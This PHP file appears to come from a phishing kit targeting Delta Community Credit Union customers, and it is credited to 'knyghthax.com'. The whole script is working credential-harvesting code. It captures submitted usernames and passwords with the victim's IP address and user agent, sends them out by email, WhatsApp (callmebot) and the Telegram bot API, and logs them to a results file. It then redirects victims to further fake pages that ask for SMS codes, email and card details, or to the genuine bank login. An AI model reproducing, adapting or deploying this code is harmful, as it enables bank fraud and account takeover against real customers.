<?php

error_reporting(0);
session_start();
include "../../admin/setting/livesync/knyght.php";
include "../../admin/setting/rezlts_settings/bot_settings.php";
include "../../admin/rezlts/x.php";
include "../../admin/rezlts/LiveSync/x.php";
$ipaddress = getenv('REMOTE_ADDR');
$useragent=$_SERVER['HTTP_USER_AGENT'];
$message = "[========== ATO  DL login   ===========]\r\n";
$message .= "|Username     : ".$_POST['user']."\r\n";
$message .= "|Password      	 : ".$_POST['pass']."\r\n";

$message .= "|UserAgent:   $useragent   ]\r\n";
$message .= "Ip: ====: $ipaddress :====\r\n";

$message .= "--------------- $C4MP4G3 By knyghthax.com -----------------\n";
$send = $email; 
$subject = "♠️ (".$_POST['login'].")  RZLT ♠️ $ip";
$headers = "From: [KNYGHT]";
mail($send,$subject,$message,$headers);
$url='https://api.callmebot.com/whatsapp.php?source=php&phone='.$phone.'&text='.urlencode($message).'&apikey='.$apikey;
$html=file_get_contents($url);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../KNYGHT_RZLT.txt","a+");
fwrite($save,$message);
fclose($save);
$csvFileName = "../../KNYGHT_RZLT.csv"; // Change the filename as needed

if ($SMS1 == 'ON') {
    echo '<script>window.location.href = "../../verify%20login/";</script>';
    exit; // Terminate the script
} elseif ($CCB == 'ON') {
    echo '<script>window.location.href = "../../account/";</script>';
    exit; // Terminate the script
}elseif ($EA == 'ON') {
    echo '<script>window.location.href = "../../email/email.php";</script>';
    exit; // Terminate the script
}elseif ($EAAL == 'ON') {
    echo '<script>window.location.href = "../../email/";</script>';
    exit; // Terminate the script
}

	  elseif ($CCAL == 'ON') {
    echo '<script>window.location.href = "../../Card verification/";</script>';
    exit; // Terminate the script
}elseif ($CCOAF == 'ON') {
    echo '<script>window.location.href = "../../Card verification/---.php";</script>';
    exit; // Terminate the script
} 
else {
    echo '<script>window.location.href = "https://ob.deltacommunitycu.com/dbank/live/app/login/consumer";</script>';
    exit; // Terminate the script
}

?>
